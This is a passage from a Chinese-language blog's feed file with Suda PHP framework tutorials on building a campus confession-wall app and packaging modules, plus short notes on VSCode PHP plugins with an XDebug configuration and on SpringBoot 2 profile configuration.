      <categories>
          
          <category> 基础教程 </category>
          
          <category> Suda框架技能使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Suda </tag>
            
            <tag> PSR4 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Suda - 12 表白墙数据存储</title>
      <link href="/2018/08/21/suda-confession-wall-table/"/>
      <url>/2018/08/21/suda-confession-wall-table/</url>
      <content type="html"><![CDATA[<p>表白墙首要的功能就是表白功能，首先我们来看看表白功能需要存储那些字段？</p><a id="more"></a><h2 id="数据字段处理"><a href="#数据字段处理" class="headerlink" title="数据字段处理"></a>数据字段处理</h2><p>在表白墙中，我们的核心数据字段主要有如下字段：</p><ul><li>发送用户</li><li>是否匿名</li><li>标题</li><li>内容</li><li>时间</li><li>IP</li><li>状态</li></ul><p>根据网络安全法的最新规定，我习惯性开发的时候记录操作的IP和时间，所有的数据基本上不会真的被删除，而是标记为一个删除状态。</p><p>在这里，我们的内容模块引用了 <code>dxkite-content-parser</code> 模块，这个模块提供了一个比较常用的功能：将输入转码存储，用的时候解码成HTML显示，主要提供了如下函数：</p><ul><li><p>content_create(string $content, string $type=’text’):Content</p><p>  将字符串创建为内容包</p></li><li><p>content_pack($content, string $type=’text’):string</p><p>  将内容包转换为数据库可用的字符串</p></li><li><p>content_unpack(string $data):?Content</p><p>  将数据库的字符串解包为内容</p></li><li><p>content_ispack(string $data)</p><p>  判断字符串是不是内容包</p></li><li><p>content_unpack2html($data):?string</p><p>  解包输出成HTML</p></li><li><p>content_unpack2raw($data):?string</p><p>  解包输出原始内容</p></li><li><p>html_content(string $content, string $type = ‘text’):string</p><p>  将内容直接输出HTML</p></li></ul><p>我们使用以上函数即可将内容转换为我们想要的内容，并且包还提供了安全处理，现在我们来创建我们的数据表</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">dxkite</span>\<span class="title">confession</span>\<span class="title">wall</span>\<span class="title">table</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 表对象，处理表白</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConfessionTable</span> <span class="keyword">extends</span> \<span class="title">suda</span>\<span class="title">archive</span>\<span class="title">Table</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> CONTENT_TYPE = <span class="string">'markdown'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> STATUS_DELETE = <span class="number">0</span>;  <span class="comment">// 删除状态</span></span><br><span class="line">    <span class="keyword">const</span> STATUS_NORMAL = <span class="number">1</span>;  <span class="comment">// 正常状态</span></span><br><span class="line">    <span class="keyword">const</span> STATUS_DRAFT = <span class="number">2</span>;  <span class="comment">// 草稿状态</span></span><br><span class="line">    <span class="keyword">const</span> ANONYMOUS = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::__construct(<span class="string">'confession'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onBuildCreator</span><span class="params">($table)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $table-&gt;fields(</span><br><span class="line">            $table-&gt;field(<span class="string">'id'</span>, <span class="string">'bigint'</span>, <span class="number">20</span>)-&gt;primary()-&gt;unsigned()-&gt;auto(),</span><br><span class="line">            $table-&gt;field(<span class="string">'user'</span>, <span class="string">'bigint'</span>, <span class="number">20</span>)-&gt;key()-&gt;comment(<span class="string">'发布者'</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'anonymous'</span>, <span class="string">'tinyint'</span>, <span class="number">1</span>)-&gt;default(<span class="keyword">self</span>::ANONYMOUS)-&gt;comment(<span class="string">'匿名发布'</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'title'</span>, <span class="string">'varchar'</span>, <span class="number">255</span>)-&gt;comment(<span class="string">'标题'</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'content'</span>, <span class="string">'text'</span>)-&gt;comment(<span class="string">"文字内容"</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'time'</span>, <span class="string">'int'</span>, <span class="number">11</span>)-&gt;key()-&gt;unsigned()-&gt;comment(<span class="string">'发表时间'</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'ip'</span>, <span class="string">'varchar'</span>, <span class="number">32</span>)-&gt;comment(<span class="string">'发布IP'</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'status'</span>, <span class="string">'int'</span>, <span class="number">11</span>)-&gt;key()-&gt;unsigned()-&gt;default(<span class="keyword">self</span>::STATUS_DRAFT)-&gt;comment(<span class="string">'状态'</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用Markdown 对内容进行默认编码</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_inputContentField</span><span class="params">(string $content)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> content_pack($content, <span class="keyword">self</span>::CONTENT_TYPE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将内容解码成HTML格式</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_outputContentField</span><span class="params">(string $content)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 解码成对象</span></span><br><span class="line">        <span class="keyword">if</span> ($object = content_unpack($content)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $object;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 未设置解码则按text编码</span></span><br><span class="line">        <span class="keyword">return</span> content_create($content, <span class="string">'text'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上便是我们的数据表结构，本次我们开发准寻一个套路：Table 负责存储、Controller负责数据处理、Provider负责API化显示，开发的时候我们采用 <code>Postman</code> 用来做API的调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Table-&gt;Controller-&gt;Provider</span><br></pre></td></tr></table></figure><h2 id="创建简单内容发布页面"><a href="#创建简单内容发布页面" class="headerlink" title="创建简单内容发布页面"></a>创建简单内容发布页面</h2><p>这个内容发布页面有几个元素，由于本次项目将直接上线，测试的模板采用 <code>Bootstrap</code> 来构建一个简单的页面。</p><p>添加一个页面 <code>/</code>，继承来自<code>support</code>库的响应 <code>dxkite\support\visitor\response\Response</code>，该响应处理基本的请求：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">dxkite</span>\<span class="title">confession</span>\<span class="title">wall</span>\<span class="title">response</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">dxkite</span>\<span class="title">support</span>\<span class="title">visitor</span>\<span class="title">response</span>\<span class="title">Response</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">dxkite</span>\<span class="title">support</span>\<span class="title">visitor</span>\<span class="title">Context</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexResponse</span> <span class="keyword">extends</span> <span class="title">Response</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onVisit</span><span class="params">(Context $context)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $view = <span class="keyword">$this</span>-&gt;view(<span class="string">'index'</span>);</span><br><span class="line">        $view-&gt;render();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="基础套版"><a href="#基础套版" class="headerlink" title="基础套版"></a>基础套版</h3><p>因为页面很多地方都似乎是共同的，我先弄一个页面套版：</p><h4 id="header-tpl-html-导航栏部分"><a href="#header-tpl-html-导航栏部分" class="headerlink" title="header.tpl.html 导航栏部分"></a>header.tpl.html 导航栏部分</h4><p>这里直接是HTML代码，还有一些引入部分的变量，以及判断页面，<br><code>@b(表达式，成功，失败)</code> 语法类似三元操作符，然后 <code>$this-&gt;isMe</code> 用于判断当前的路由是否为指定的路由，这里判断是否为 <code>index</code> 路由。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navbar navbar-dark sticky-top bg-dark navbar-expand-lg flex-md-nowrap p-0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand col-sm-3 col-md-2 mr-0"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>&#123;&#123; $:website_name('涉外学院 - 表白墙') &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"navbar-nav mr-auto"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"navbar-nav px-3"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item text-nowrap"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link @b($this-&gt;isMe('index'),'active')"</span> <span class="attr">href</span>=<span class="string">"@u('index')"</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h4 id="layout-tpl-html-布局控制部分"><a href="#layout-tpl-html-布局控制部分" class="headerlink" title="layout.tpl.html 布局控制部分"></a>layout.tpl.html 布局控制部分</h4><p><code>@extend</code> 继承来自support模块的bootstrap模板。<br><code>@startInsert ... @endInsert</code> 用于往继承的模板中的 <code>@insert</code> 点插入代码。<br>这里预留了一个插入点 <code>confession-content</code> 用于插入内容。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@extend ('support:bootstrap') </span><br><span class="line">@startInsert('bs-head')</span><br><span class="line"><span class="comment">&lt;!-- css --&gt;</span></span><br><span class="line">@endInsert </span><br><span class="line">@startInsert('bs-content') </span><br><span class="line">@include ('header')</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    @if ($?:alert)</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"alert alert-&#123;&#123; $:alert.type &#125;&#125; m-2"</span> <span class="attr">role</span>=<span class="string">"alert"</span>&gt;</span> &#123;&#123; $:alert.text &#125;&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"close"</span> <span class="attr">data-dismiss</span>=<span class="string">"alert"</span> <span class="attr">aria-label</span>=<span class="string">"Close"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;times;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    @endif </span><br><span class="line">    @insert('confession-content')</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">@endInsert</span><br></pre></td></tr></table></figure><h4 id="index-tpl-html"><a href="#index-tpl-html" class="headerlink" title="index.tpl.html"></a>index.tpl.html</h4><p>在主页面，继承<code>layout</code>，并在 <code>confession-content</code> 插入点插入内容。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@extend ('layout')</span><br><span class="line"><span class="comment">&lt;!-- 插入内容 --&gt;</span></span><br><span class="line">@startInsert('confession-content')</span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>这里是内容<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">@endInsert</span><br></pre></td></tr></table></figure></p><p>所有布局文件完善后：</p><p><img src="0.png" alt=""></p><p>运行效果</p><p><img src="1.png" alt=""></p><p>显示：</p><p><img src="2.png" alt=""></p>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Suda框架技能使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Suda </tag>
            
            <tag> 表白墙 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>VSCode插件恢复配置记录</title>
      <link href="/2018/08/18/my-vsc-plugin/"/>
      <url>/2018/08/18/my-vsc-plugin/</url>
      <content type="html"><![CDATA[<p>在北京，，忽然就蓝屏，暴躁老哥我直接格式化系统盘。。VSCode重装以后回复一波插件，记录一下</p><a id="more"></a><h2 id="PHP-Debug"><a href="#PHP-Debug" class="headerlink" title="PHP Debug"></a>PHP Debug</h2><p>PHP调试用的东西，需要的时候还行，基本配置：<a href="https://xdebug.org/wizard.php" target="_blank" rel="noopener">https://xdebug.org/wizard.php</a></p><p><img src="0.png" alt=""></p><p>使用方式：把phpinfo的内容复制到框框中：</p><p><img src="1.png" alt=""></p><p>点击分析之后：</p><p><img src="2.png" alt=""></p><p>按照配置安装即可，<code>php.ini</code> 我的配置，其中带路径的配置，自己调整好。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">xdebug.profiler_output_dir=&quot;D:\software\phpStudy\PHPTutorial\tmp\xdebug&quot;</span><br><span class="line">xdebug.trace_output_dir=&quot;D:\software\phpStudy\PHPTutorial\tmp\xdebug&quot;</span><br><span class="line">zend_extension = D:\software\phpStudy\PHPTutorial\php\php-7.2.1-nts\ext\php_xdebug-2.6.0-7.2-vc15-nts.dll</span><br><span class="line">xdebug.remote_enable = on</span><br><span class="line">xdebug.remote_handler = dbgp</span><br><span class="line">xdebug.show_local_vars=0</span><br><span class="line">xdebug.remote_autostart= 1</span><br></pre></td></tr></table></figure><h2 id="PHP-Symbols"><a href="#PHP-Symbols" class="headerlink" title="PHP Symbols"></a>PHP Symbols</h2><p>用于定位函数和符号</p><p><img src="3.png" alt=""></p><h2 id="PHP-DocBlocker"><a href="#PHP-DocBlocker" class="headerlink" title="PHP DocBlocker"></a>PHP DocBlocker</h2><p>自动注释</p><p><img src="4.png" alt=""></p><h2 id="php-cs-fixer"><a href="#php-cs-fixer" class="headerlink" title="php cs fixer"></a>php cs fixer</h2><p>用于格式化代码。需要下载 <code>php-cs-fixer</code> 格式化代码美滋滋</p><h2 id="Git-History-Diff"><a href="#Git-History-Diff" class="headerlink" title="Git History Diff"></a>Git History Diff</h2><p>用于查看变化文件</p>]]></content>
      
      <categories>
          
          <category> 杂记分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VSCode </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Suda - 11 表白墙的设计</title>
      <link href="/2018/08/13/suda-confession-wall-design/"/>
      <url>/2018/08/13/suda-confession-wall-design/</url>
      <content type="html"><![CDATA[<p>接下来的时间，我们来尝试自己写一个表白墙，我们来思考一下表白墙的功能？</p><a id="more"></a><h2 id="需求思考"><a href="#需求思考" class="headerlink" title="需求思考"></a>需求思考</h2><ul><li>表白墙需要发送帖子，这个帖子可能包括了图片、表情、文字</li><li>发送的表白帖子可以被点赞</li><li>自己可以删除自己的表白帖</li><li>界面可能要长的好看点</li><li>表白帖子的内容是可以评论的</li><li>评论可以点赞</li></ul><p>根据上面的简单需求，我们可以整理下我们自己的思路</p><p><img src="1.png" alt=""></p><p>这些就是我们大概的一个功能，思考一下路由：</p><h2 id="路由的设计"><a href="#路由的设计" class="headerlink" title="路由的设计"></a>路由的设计</h2><ul><li>应用路由<ul><li>index 显示表白帖子</li><li>search 显示搜索表白内容的帖子</li><li>confession 显示表白内容的帖子，包括评论</li><li>write 写表白帖子的页面</li><li>repot 举报表白帖</li></ul></li><li><p>管理路由</p><ul><li><p>admin_list 显示表白帖</p><p>  具体功能</p><ul><li>view 查看帖子</li><li>delete 删除表白帖</li><li>search 搜索帖子</li><li>close 关闭帖子回复</li></ul></li></ul></li></ul><p>emmm，貌似多了一个，举报，毕竟没有审核的表白帖，还是加一个举报功能的好</p><h2 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h2><p>表白墙的功能比较简单，就一个模块就好，本次我们专注表白墙功能的开发，引入一下我写的模块</p><ul><li><p>support 模块 <a href="dxkite-support.18.08.13.mod">下载</a></p><p>  提供了基础文件上传、数据维护、网站维护、权限系统等功能</p></li><li><p>user 模块 <a href="dxkite-user.18.08.13.mod">下载</a></p><p>  基于support模块开发的，提供了用户登陆注册等功能</p></li><li><p>content-parser 模块 <a href="dxkite-content-parser.18.08.13.mod">下载</a></p><p>  提供内容的处理，目前支持markdown处理和html以及纯文本处理</p></li></ul><h2 id="可能的功能"><a href="#可能的功能" class="headerlink" title="可能的功能"></a>可能的功能</h2><p>富文本编辑器（提供文本，表情、图片内容编辑的功能），在后续开发中找一个。。。</p><h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><ul><li>添加好路由</li><li>安装好模块，使用户模块能够正常运行</li></ul>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Suda框架技能使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Suda </tag>
            
            <tag> 表白墙 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SpringBoot 2 中的配置文件运行时指定</title>
      <link href="/2018/08/09/springboot2-jar-config-yml/"/>
      <url>/2018/08/09/springboot2-jar-config-yml/</url>
      <content type="html"><![CDATA[<p>因为一个配置文件，搞了我几天，记录一下</p><a id="more"></a><h2 id="Springboot2-配置文件配置顺序"><a href="#Springboot2-配置文件配置顺序" class="headerlink" title="Springboot2 配置文件配置顺序"></a>Springboot2 配置文件配置顺序</h2><p>在 Springboot2中，配置文件配置文件的加载和覆盖顺序如下</p><p><img src="1.png" alt=""></p><p>也就是说，<code>application.yml</code> 配置优先于 <code>application-xx.yml</code> 加载，并且 <code>application-xxx.yml</code> 的配置项可以覆盖 <code>application.yml</code> 的配置项</p><p><strong>就是这个坑！！！！</strong></p><h2 id="运行指定配置"><a href="#运行指定配置" class="headerlink" title="运行指定配置"></a>运行指定配置</h2><p>在 Springboot2 的jar包直接运行，用命令参数 <code>--spring.profiles.active</code> 指定激活的配置项</p><blockquote><p>指定使用 application-dev.yml 配置</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar xxx.jar --spring.profiles.active=dev</span><br></pre></td></tr></table></figure><p>这样加载的配置会覆盖 <code>application.yml</code> 的配置文件。</p><h2 id="运行指定配置文件"><a href="#运行指定配置文件" class="headerlink" title="运行指定配置文件"></a>运行指定配置文件</h2><p>在 Springboot2 的jar包直接运行， 用命令参数 <code>--spring.config.location</code> 指定使用外部配置文件，<strong>不会覆盖jar包中的<code>application.jar</code>配置项，或者说就没加载！</strong> 昂，然后我就被坑了，只在外部配置文件中指定部分配置，然后凉了，mybatis-plus 没指定 mapper文件，GG</p>]]></content>
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> SpringBoot 2.0 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Suda - 10 模块化编程与模块创建和使用</title>
      <link href="/2018/08/08/suda-use-module/"/>
      <url>/2018/08/08/suda-use-module/</url>
      <content type="html"><![CDATA[<p>在Suda框架中，支持模块化编程，也就是功能可以作为一个个模块来加入或者使用，这里我们先学会做一个模块包吧！</p><a id="more"></a><h2 id="创建模块包"><a href="#创建模块包" class="headerlink" title="创建模块包"></a>创建模块包</h2><p>在<a href="https://github.com/DXkite/suda/commit/9cd673b1ed76337fe9ef9b0685f77d2ba88471ed" target="_blank" rel="noopener">Suda最新的版本更新</a>中，支持模块以压缩包的形式发布</p><p>发布要求：</p><ol><li>完整的功能模块包</li><li>没有父级文件夹</li></ol><h3 id="压缩文件"><a href="#压缩文件" class="headerlink" title="压缩文件"></a>压缩文件</h3><p>打开我们写好的成绩统计模块，对他使用ZIP进行压缩，压缩后，压缩包的结构如下：</p><p><img src="1.png" alt=""></p><h3 id="重命名"><a href="#重命名" class="headerlink" title="重命名"></a>重命名</h3><p>将压缩包重命名为 <code>statistical.mod</code> 放置到模块目录下，现在的模块结构是这样的：</p><p><img src="2.png" alt=""></p><p>然后现在把 <code>statistical</code> 文件夹处理掉（删除或者保存到其他地方）,访问网站目录，可以看到网站依旧运行了</p><p><img src="3.png" alt=""></p><p>整个模块的代码会被解压到 <code>data/runtime/modules/模块文件名文件夹/</code> 下，没必要管他了：</p><p><img src="4.png" alt=""></p><p>如果运行失败，检擦一下框架的版本号和压缩包的内容是否正确。</p><h2 id="引入其他模块"><a href="#引入其他模块" class="headerlink" title="引入其他模块"></a>引入其他模块</h2><p>我们在开发的过程中，我们有些功能不想开发，然后刚刚好网上又有这个，就拿来用就好（PS：Suda模块中心应该提上日程了）</p><p>这里我们玩一下两个模块：</p><ul><li><p>支持模块 </p><p>  提供文件，数据库，网站设置等基础功能的支持 <a href="dxkite-support.18.08.10.mod">下载</a></p></li><li><p>用户模块</p><p>  提供用户的注册登陆等功能 <a href="dxkite-user.18.08.10.mod">下载</a></p></li></ul><p>下载完成后，放到模块文件夹下面，现在的文件夹结构：</p><p><img src="5.png" alt=""></p><p>我们先访问一下网站，没出错的话模块算是安装成功了。</p><h2 id="启用模块"><a href="#启用模块" class="headerlink" title="启用模块"></a>启用模块</h2><p>模块安装后，不启用是没法使用的（安全性考虑），所以，现在我们需要手动启用：编辑 <code>manifast.json</code> 文件：</p><p><img src="/images/placeholder.png" alt="" data-src="6.png" class="lazyload"></p><ul><li>注册模块：注册模块后，模块的 share 文件夹的代码和 resource 的资源都可以被使用</li><li>启用模块：启用模块后，模块可以通过浏览器访问</li></ul><p>启用模块后，我们访问： host/dev.php/setting 应该可以看到如下页面，说明我们的模块安装成功</p><p><img src="/images/placeholder.png" alt="" data-src="7.png" class="lazyload"></p><h2 id="发布版本"><a href="#发布版本" class="headerlink" title="发布版本"></a>发布版本</h2><p>在项目主页选择版本：</p><p><img src="/images/placeholder.png" alt="" data-src="8.png" class="lazyload"></p><p><img src="/images/placeholder.png" alt="" data-src="9.png" class="lazyload"></p><p>填写好版本信息，并上传模块打包后的包</p><p><img src="/images/placeholder.png" alt="" data-src="10.png" class="lazyload"></p><p>发布成功后：</p><p><img src="/images/placeholder.png" alt="" data-src="11.png" class="lazyload"></p><h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><ul><li>打包自己的模块</li><li>安装两个模块测试</li><li>发布自己的模块</li></ul>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Suda框架技能使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Suda </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Suda - 09 成绩统计系统 - 数据处理</title>
      <link href="/2018/08/07/suda-results-statistical-data/"/>
      <url>/2018/08/07/suda-results-statistical-data/</url>
      <content type="html"><![CDATA[<p>前面我们写了表单填写界面的生成以及表单的创建，今天我们来处理数据的输入和导出</p><a id="more"></a><h2 id="数据写入"><a href="#数据写入" class="headerlink" title="数据写入"></a>数据写入</h2><p>在前面，我们写的 <code>form</code> 表单中写入的是 name, number 和一个包含成绩的 data 数组，现在我们来处理它</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">dxkite</span>\<span class="title">statistical</span>\<span class="title">response</span>;</span><br><span class="line"></span><br><span class="line"><span 